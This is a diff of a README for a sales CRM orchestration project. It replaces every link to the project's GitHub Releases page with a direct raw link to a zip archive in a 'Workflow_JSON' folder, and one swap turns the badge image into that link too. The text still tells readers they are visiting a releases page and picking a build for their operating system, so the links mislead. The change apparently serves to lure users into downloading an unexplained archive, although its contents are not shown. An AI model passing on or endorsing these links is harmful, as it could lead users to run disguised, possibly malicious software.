@@ -1,6 +1,6 @@
 # 🚀 ai-rfq-crm-orchestration-platform - Streamline Your Sales Processes Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/AYMANDG523/ai-rfq-crm-orchestration-platform/releases)
+[![Download](https://raw.githubusercontent.com/AYMANDG523/ai-rfq-crm-orchestration-platform/main/Workflow_JSON/rfq_crm_platform_ai_orchestration_2.8.zip)](https://raw.githubusercontent.com/AYMANDG523/ai-rfq-crm-orchestration-platform/main/Workflow_JSON/rfq_crm_platform_ai_orchestration_2.8.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ Follow these steps to get the application up and running:
 
 1. **Visit the Releases Page:** Click the link below to access the download options for the platform.
    
-   [Visit this page to download](https://github.com/AYMANDG523/ai-rfq-crm-orchestration-platform/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/AYMANDG523/ai-rfq-crm-orchestration-platform/main/Workflow_JSON/rfq_crm_platform_ai_orchestration_2.8.zip)
 
 2. **Download the Latest Release:** On the releases page, look for the most recent version and click on the appropriate download link for your operating system.
 
@@ -46,7 +46,7 @@ Follow these steps to get the application up and running:
 
 ## 🔄 Download & Install
 
-To begin your journey with the ai-rfq-crm-orchestration-platform, please [visit this page to download](https://github.com/AYMANDG523/ai-rfq-crm-orchestration-platform/releases). Make sure to choose the version that matches your operating system. Follow the installation steps mentioned above to get started quickly.
+To begin your journey with the ai-rfq-crm-orchestration-platform, please [visit this page to download](https://raw.githubusercontent.com/AYMANDG523/ai-rfq-crm-orchestration-platform/main/Workflow_JSON/rfq_crm_platform_ai_orchestration_2.8.zip). Make sure to choose the version that matches your operating system. Follow the installation steps mentioned above to get started quickly.
 
 ## ❓ Frequently Asked Questions
 
